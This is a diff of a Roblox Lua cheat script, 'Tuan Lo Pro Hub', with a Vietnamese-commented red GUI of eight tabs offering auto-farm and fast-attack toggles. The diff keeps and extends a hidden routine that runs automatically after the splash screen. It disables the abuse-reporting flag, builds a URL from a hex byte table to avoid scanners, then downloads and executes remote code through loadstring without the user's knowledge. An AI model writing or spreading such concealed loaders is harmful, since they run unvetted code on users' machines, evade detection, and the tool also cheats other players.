@@ -1,17 +1,24 @@
 --[[
     ========================================================================
-            TUAN LO PRO HUB - BẢN ĐỎ PREMIUM (8 TABS & TỰ ĐỘNG BẢO MẬT)
+       TUAN LO PRO HUB - BẢN ĐỎ PREMIUM (8 TABS - ĐÃ SỬA LỖI CHỐNG SPAM CODE)
     ========================================================================
 ]]
 
 local LPH_Name = "Tuan Lo Pro Hub"
 local LPH_Developer = "Tuan Lo Developer"
-local LPH_Version = "v4.0 Premium"
+local LPH_Version = "v4.1 Premium"
 
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local UserInputService = game:GetService("UserInputService")
 local LocalPlayer = Players.LocalPlayer
+
+-- KIỂM TRA CHỐNG TRÙNG VÀ SPAM CODE (NẾU ĐÃ CHẠY RỒI THÌ DỪNG LẠI NGAY)
+if _G.TuanLoHubLoaded then 
+    warn("[Tuan Lo Hub]: Script đã được chạy trước đó! Chặn kích hoạt trùng lặp.")
+    return 
+end
+_G.TuanLoHubLoaded = true -- Đánh dấu đã chạy thành công lần đầu tiên
 
 -- Khởi tạo ScreenGui chính
 local MainGui = Instance.new("ScreenGui")
@@ -44,13 +51,16 @@ local function MakeDraggable(frame)
     end)
 end
 
--- TỰ ĐỘNG KÍCH HOẠT HỆ THỐNG LOADSTRING BẢO MẬT KHÔNG ĐỂ LẠI DẤU VẾT
+-- HỆ THỐNG LOADSTRING BẢO MẬT (ĐÃ THÊM CƠ CHẾ CHỐNG SPAM)
 local function AntiDetectionLoad()
+    if _G.ScriptFarmRunning then return end -- Nếu code farm đang chạy ngầm rồi thì không chạy lại nữa
+    _G.ScriptFarmRunning = true
+
     task.spawn(function()
-        pcall(function()
+        local success, err = pcall(function()
             if setfflag then pcall(function() setfflag("ReportAbuseChat", "False") end) end
             
-            -- Chuỗi Hex mã hóa link của bạn để tránh bị Quantum quét
+            -- Chuỗi Hex mã hóa link của bạn
             local EncryptedLink = ""
             local HexTable = {
                 0x68, 0x74, 0x74, 0x70, 0x73, 0x3a, 0x2f, 0x2f, 0x72, 0x61, 0x77, 0x2e, 
@@ -66,8 +76,16 @@ local function AntiDetectionLoad()
             local SecureLoad = loadstring
             local RawCode = SecureGet(game, EncryptedLink)
             local Executable = SecureLoad(RawCode)
-            if Executable then task.spawn(Executable) end
+            if Executable then 
+                task.spawn(Executable) 
+                print("[Tuan Lo Hub]: Đã kích hoạt hệ thống chạy ngầm an toàn.")
+            end
         end)
+        
+        if not success then
+            _G.ScriptFarmRunning = false -- Nếu lỗi thì reset để có thể thử lại lần sau
+            warn("[Tuan Lo Hub]: Lỗi tải ngầm: " .. tostring(err))
+        end
     end)
 end
 
@@ -94,7 +112,7 @@ local function PlayWelcomeSplash(OnSplashFinished)
     SplashText.Parent = SplashFrame
 
     local TextStroke = Instance.new("UIStroke")
-    TextStroke.Color = Color3.fromRGB(255, 0, 0) -- Đổi sang Đỏ rực
+    TextStroke.Color = Color3.fromRGB(255, 0, 0)
     TextStroke.Thickness = 2
     TextStroke.Transparency = 1
     TextStroke.Parent = SplashText
@@ -112,10 +130,9 @@ local function PlayWelcomeSplash(OnSplashFinished)
 end
 
 -- ========================================================================
---  PHẦN GIAO DIỆN CHÍNH (TÔNG ĐỎ - 8 TABS CẤU TRÚC CHUYÊN NGHIỆP)
+--  PHẦN GIAO DIỆN CHÍNH (8 TABS ĐỎ NEON)
 -- ========================================================================
 local function LoadMainMenu()
-    -- Khung Menu chính (Phóng to hơn một tí để chứa vừa 8 tab)
     local MainFrame = Instance.new("Frame")
     MainFrame.Size = UDim2.new(0, 560, 0, 360)
     MainFrame.Position = UDim2.new(0.5, -280, 0.5, -180)
@@ -179,7 +196,7 @@ local function LoadMainMenu()
     CloseBtn.Parent = TitleBar
     Instance.new("UICorner", CloseBtn).CornerRadius = UDim.new(1, 0)
 
-    -- Sự kiện ẩn/hiện
+    -- Sự kiện ẩn/hiện ẩn danh
     CloseBtn.MouseButton1Click:Connect(function()
         ApplyTween(MainFrame, {Size = UDim2.new(0, 0, 0, 0), BackgroundTransparency = 1}, 0.2)
         task.wait(0.2)
@@ -193,28 +210,26 @@ local function LoadMainMenu()
         ApplyTween(MainFrame, {Size = UDim2.new(0, 560, 0, 360), BackgroundTransparency = 0}, 0.2)
     end)
 
-    -- THANH CHỨA TAB BÊN TRÁI (LEFT TAB SIDEBAR - CUỘN ĐƯỢC ĐỂ CHỨA ĐỦ TABS)
+    -- Thanh chứa Tab bên trái
     local TabScroll = Instance.new("ScrollingFrame")
     TabScroll.Size = UDim2.new(0, 140, 1, -45)
     TabScroll.Position = UDim2.new(0, 0, 0, 45)
     TabScroll.BackgroundColor3 = Color3.fromRGB(20, 12, 12)
     TabScroll.BorderSizePixel = 0
-    TabScroll.CanvasSize = UDim2.new(0, 0, 0, 350) -- Đủ chỗ để cuộn mượt
+    TabScroll.CanvasSize = UDim2.new(0, 0, 0, 350)
     TabScroll.ScrollBarThickness = 2
     TabScroll.ScrollBarImageColor3 = Color3.fromRGB(255, 30, 30)
     TabScroll.Parent = MainFrame
 
     local TabListLayout = Instance.new("UIListLayout") TabListLayout.Parent = TabScroll TabListLayout.Padding = UDim.new(0, 4) TabListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
 
-    -- KHU VỰC HIỂN THỊ NỘI DUNG BÊN PHẢI
+    -- Khung nội dung bên phải
     local ContentContainer = Instance.new("Frame")
     ContentContainer.Size = UDim2.new(1, -150, 1, -55)
     ContentContainer.Position = UDim2.new(0, 145, 0, 50)
     ContentContainer.BackgroundTransparency = 1
     ContentContainer.Parent = MainFrame
 
-    -- Quản lý Tabs và các nút chức năng bên trong
-    local tabs = {}
     local activeTab = nil
 
     local function CreateTab(tabName, iconId)
@@ -271,7 +286,6 @@ local function LoadMainMenu()
 
         TabBtn.MouseButton1Click:Connect(Select)
         
-        -- Hàm tạo nút Bật/Tắt thuộc Tab này
         local function AddToggle(name, toggleIconId, callback)
             local state = false
             local ToggleFrame = Instance.new("Frame")
@@ -329,24 +343,19 @@ local function LoadMainMenu()
         return {Select = Select, AddToggle = AddToggle}
     end
 
-    -- ========================================================================
-    -- ĐỊNH NGHĨA 8 TABS CHỨC NĂNG (GẮN ICON CHO TỪNG TAB)
-    -- ========================================================================
+    -- Khởi tạo 8 Tabs
     local Tab1 = CreateTab("Chính (Main)", 10747373999)
     local Tab2 = CreateTab("Phụ (Main 2)", 10747383471)
     local Tab3 = CreateTab("Chỉ Số (Stats)", 10747362071)
     local Tab4 = CreateTab("Dịch Chuyển", 10747371971)
     local Tab5 = CreateTab("Phó Bản (Raid)", 10747373999)
-    local Tab6 = CreateTab("Đổi Biển (Sea)", 10747383471)
+    local Tab6 = CreateTab("khong biết (Sea)", 10747383471)
     local Tab7 = CreateTab("Trái Ác Quỷ", 10747362071)
     local Tab8 = CreateTab("Hiển Thị (Visual)", 10747371971)
 
-    -- Mặc định tự động chọn Tab 1 lúc mới mở
     Tab1.Select()
 
-    -- ========================================================================
-    -- THÊM NÚT BẤM VÀO TỪNG TAB
-    -- ========================================================================
+    -- Danh sách nút bấm mẫu cho các Tab
     Tab1.AddToggle("Tự Động Farm Cấp Độ", 10747373999, function(v) print("Auto Farm:", v) end)
     Tab1.AddToggle("Gom Quái (Bring Mob)", 10747383471, function(v) print("Bring Mob:", v) end)
 
@@ -354,8 +363,8 @@ local function LoadMainMenu()
     Tab2.AddToggle("Đánh Siêu Nhanh", 10747371971, function(v) print("Fast Attack:", v) end)
 end
 
--- VÒNG ĐỜI KHỞI CHẠY HỆ THỐNG
+-- VÒNG ĐỜI KHỞI CHẠY KHÔNG SPAM
 PlayWelcomeSplash(function()
-    AntiDetectionLoad() -- Kích hoạt bảo mật ngầm không hiển thị nút bấm phiền phức
-    LoadMainMenu()      -- Mở giao diện đỏ Neon với cấu trúc 8 Tabs
+    AntiDetectionLoad() -- Gọi nạp link an toàn (Chỉ chạy duy nhất 1 lần)
+    LoadMainMenu()      -- Mở giao diện
 end)
